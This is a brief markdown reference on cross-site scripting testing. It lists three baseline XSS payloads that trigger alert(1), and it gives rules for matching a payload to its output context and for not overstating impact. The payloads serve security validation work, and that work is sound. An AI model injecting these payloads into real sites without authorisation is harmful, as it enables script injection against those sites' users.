# XSS Payload Notes

Use payloads as validation tools, not as proof by themselves.

## Baseline checks

```text
<svg/onload=alert(1)>
"><svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

## Usage rules

- Match the payload to the output context.
- Prefer the smallest payload that proves execution.
- Capture the exact sink and escaping behavior.
- Do not overstate impact until you show a realistic consequence.
